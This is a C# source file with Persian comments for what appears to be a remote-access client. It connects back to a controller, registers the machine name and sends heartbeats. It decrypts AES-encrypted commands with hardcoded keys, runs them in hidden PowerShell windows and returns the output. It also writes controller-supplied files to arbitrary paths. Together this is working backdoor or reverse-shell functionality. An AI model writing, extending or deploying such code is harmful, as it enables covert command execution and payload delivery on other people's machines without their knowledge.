using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Diagnostics.Eventing.Reader;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace ServerApp
{
    class Program
    {
        private static readonly string Key = "my-super-secret-key!"; // کلید 32 بایتی
        private static readonly string IV = "my-init-vector-123";    // مقدار IV ثابت 16 بایتی

        public static bool flag = false;
        public static bool flag1 = false;
        const string controllerIp = "127.0.0.1"; // آدرس IP RemoteController
        const int port = 5000; // پورتی که سرور گوش می‌دهد
        public static string clientName = Environment.MachineName;
        public static string key = "-key-key-@-key-key-@-key-key-@##";
    //  public static  bool isSendingFile = false; // وضعیت ارسال فایل
        public static  TcpClient client = null;
        // صف‌ها برای پیام‌های ورودی و خروجی
        public static ConcurrentQueue<string> incomingQueue = new ConcurrentQueue<string>();
        public static ConcurrentQueue<string> outgoingQueue = new ConcurrentQueue<string>();
        static void Main(string[] args)
        {

              string Decrypt(string cipherText)
            {
                using (Aes aes = Aes.Create())
                {
                    aes.Key = Encoding.UTF8.GetBytes(Key.PadRight(32).Substring(0, 32));
                    aes.IV = Encoding.UTF8.GetBytes(IV.PadRight(16).Substring(0, 16));
                    aes.Mode = CipherMode.CBC;

                    using (ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                    {
                        byte[] cipherBytes = Convert.FromBase64String(cipherText);
                        byte[] plainBytes = decryptor.TransformFinalBlock(cipherBytes, 0, cipherBytes.Length);
                        return Encoding.UTF8.GetString(plainBytes);
                    }
                }
            }
            void retrytoconnect()
            {
                // حلقه تلاش برای اتصال به کنترلر
                while (true)
                {
                    try
                    {
                        client = new TcpClient();
                        Console.WriteLine("\nAttempting to connect to RemoteController...");
                        client.Connect(controllerIp, port); // تلاش برای اتصال
                        Console.WriteLine("Connected to RemoteController.");
                        flag = false;
                        HandleConnection(client);
                      
                      //  break; // خروج از حلقه در صورت اتصال موفق
                       
                    }
                    catch (SocketException)
                    {
                        Console.WriteLine("\nController is not available. Retrying in 5 seconds...");
                        Thread.Sleep(5000); // انتظار برای تلاش مجدد
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Unexpected error: {ex.Message}");
                    }
                }
            }
           


            void HandleConnection(TcpClient client)
            {
                try
                {
                    NetworkStream stream = client.GetStream();
                    StreamReader reader = new StreamReader(stream, Encoding.UTF8);
                    StreamWriter writer = new StreamWriter(stream, Encoding.UTF8) { AutoFlush = true };
                    BinaryReader breader = new BinaryReader(stream);
                    while (true)
                    {
                        try
                        {
                            if (!flag)
                            {
                                //writer.WriteLine($"register:{clientName}");
                                //Console.WriteLine("\nRegistration message sent.");
                                string message = $"register:{clientName}";
                                outgoingQueue.Enqueue(message);
                                flag = true;
                                stream.Flush();
                                reader.DiscardBufferedData();

                            }
                            else
                            {

                                //writer.WriteLine($"heartbeat:{clientName}");
                                //Console.WriteLine("\nHeartbeat message sent.");
                                string message = $"heartbeat:{clientName}";
                                outgoingQueue.Enqueue(message);
                                stream.Flush();
                                    reader.DiscardBufferedData();
                                



                            }
                           
                                lock (outgoingQueue)
                                {
                                    if (outgoingQueue.TryDequeue(out string message))
                                    {
                                        Console.WriteLine($"Processing message: {message}");

                                        if (message.StartsWith("register"))
                                        {
                                            writer.WriteLine($"register:{clientName}");
                                            Console.WriteLine("\nRegistration message sent.");


                                        }
                                        else if (message.StartsWith("heartbeat"))
                                        {
                                            writer.WriteLine($"heartbeat:{clientName}");
                                            Console.WriteLine("\nHeartbeat message sent.");
                                        }
                                        else
                                        {
                                            Console.WriteLine($"Unknown message type: {message}");
                                        }
                                    }
                                }

                                Thread.Sleep(10); // تأخیر کوچک برای بهینه‌سازی CPU
                                                  // بررسی دستورات از کنترلر
                            while (stream.DataAvailable)
                            {

                                Thread.Sleep(1000);
                                // خواندن پیام و حذف فضای خالی یا کاراکتر اضافی
                                string message = "";
                                stream.Flush();
                                reader.DiscardBufferedData();

                                message = reader.ReadLine();
                                outgoingQueue.Enqueue(message);
                                Thread.Sleep(2000);
                                // Console.WriteLine($"\nRaw message received: {message}");

                                // تخلیه بافر برای پاک‌سازی داده‌های باقی‌مانده
                                reader.DiscardBufferedData();
                            }

                            lock (outgoingQueue)
                            {
                                if (outgoingQueue.TryDequeue(out string message))
                                {
                                    Console.WriteLine($"Processing message: {message}");
                                    string decryptedMessage = Decrypt(message);
                                    message = decryptedMessage;
                                    //Console.WriteLine(decryptedMessage);

                                    if (!string.IsNullOrEmpty(message))
                                    {
                                        Thread.Sleep(1000);
                                        if (message.StartsWith("cmd:")) // دستور
                                        {
                                            //if (!flag1)
                                            //{

                                                string command = message.Substring(4);
                                                Console.WriteLine($"\nCommand received: {command}");

                                                // اجرای دستور CMD
                                                string result = ExecuteCommand(command);
                                                Console.WriteLine($"\nResult: {result}");

                                                // ارسال نتیجه
                                                string[] resultLines = result.Split(new[] { "\r\n", "\n" }, StringSplitOptions.None);
                                                foreach (var line in resultLines)
                                                {
                                                    writer.WriteLine($"result:{line}");
                                                }
                                                writer.WriteLine("endresult");
                                                message = "";
                                              //  flag1 = true;
                                                stream.Flush();
                                            client.Dispose();
                                            //}

                                            //else
                                            //{

                                            //    string command = message.Substring(5);
                                            //    Console.WriteLine($"\nCommand received: {command}");

                                            //    // اجرای دستور CMD
                                            //    string result = ExecuteCommand(command);
                                            //    Console.WriteLine($"\nResult: {result}");

                                            //    // ارسال نتیجه
                                            //    string[] resultLines = result.Split(new[] { "\r\n", "\n" }, StringSplitOptions.None);
                                            //    foreach (var line in resultLines)
                                            //    {
                                            //        writer.WriteLine($"result:{line}");
                                            //    }
                                            //    writer.WriteLine("endresult");
                                            //    message = "";
                                            //    stream.Flush();

                                            //}

                                        }

                                        else if (message.StartsWith("file:"))
                                        {
                                            try
                                            {

                                                stream.ReadTimeout = 15000; // تنظیم تایم‌اوت 15 ثانیه
                                                Console.WriteLine($"\nCommand received: {message}");
                                                stream.Flush();
                                                string fileName = breader.ReadString(); // دریافت نام فایل
                                                string destinationPath = breader.ReadString(); // دریافت مسیر مقصد
                                                long fileLength = breader.ReadInt64(); // دریافت طول فایل

                                                string fullPath = Path.Combine(destinationPath, fileName);
                                                Console.WriteLine($"Receiving file: {fileName} ({fileLength} bytes)");

                                                using (FileStream fs = new FileStream(fullPath, FileMode.Create, FileAccess.Write))
                                                {

                                                    byte[] buffer = new byte[8192];
                                                    int bytesRead;
                                                  
                                                    long totalBytesReceived = 0;

                                                    while (totalBytesReceived < fileLength)
                                                    {
                                                        bytesRead = stream.Read(buffer, 0, buffer.Length);
                                                        if (bytesRead <= 0)
                                                        {
                                                            throw new IOException("Connection closed or no more data to read.");
                                                        }

                                                        fs.Write(buffer, 0, bytesRead);
                                                        writer.Flush(); // اطمینان از نوشتن کامل داده
                                                        totalBytesReceived += bytesRead;

                                                        // نمایش پراگرس بار
                                                        ShowProgress(totalBytesReceived, fileLength);
                                                    }
                                                }
                                                stream.Flush();

                                                Console.WriteLine($"\nFile saved to {fullPath}");
                                                client.Dispose();
                                            }
                                            catch (IOException ex)
                                            {
                                                Console.WriteLine($"File transfer timeout or connection closed: {ex.Message}");
                                            }
                                            catch (Exception ex)
                                            {
                                               // Console.WriteLine($"Error receiving file: {ex.Message}");
                                                Console.WriteLine($"Error receiving file");
                                                retrytoconnect();
                                            }

                                        }

                                        else
                                        {
                                            Console.WriteLine($"Unknown message");
                                            // Console.WriteLine($"Unknown message: {message}");
                                            retrytoconnect();
                                        }
                                    }


                                    else
                                    {
                                        Console.WriteLine($"Unknown message type: {message}");
                                    }
                                }
                            }

                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Error while processing data: {ex.Message}");
                            break;
                        }

                        Thread.Sleep(5000);
                    }

                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error in communication: {ex.Message}");
                }
                finally
                {
                    client?.Close();
                    Console.WriteLine("Connection to RemoteController closed.");
                    retrytoconnect();
                    
                }
            }
           
           
            retrytoconnect();

         

            void ShowProgress(long bytesTransferred, long totalBytes)
            {
                int progressBarWidth = 50; // عرض پراگرس بار
                double percentage = (double)bytesTransferred / totalBytes;
                int filledBars = (int)(percentage * progressBarWidth);

                Console.CursorLeft = 0;
                Console.Write("[");
                Console.Write(new string('#', filledBars));
                Console.Write(new string('-', progressBarWidth - filledBars));
                Console.Write($"] {percentage:P0}");
            }

           
        }

        static string ExecuteCommand(string command)
        {
            try
            {
                Process process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "powershell.exe",
                        Arguments = $"/c {command}",
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    }
                };

                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                return string.IsNullOrWhiteSpace(error) ? output : error;
            }
            catch (Exception ex)
            {
                return $"Error executing command: {ex.Message}";
            }
        }



    }
}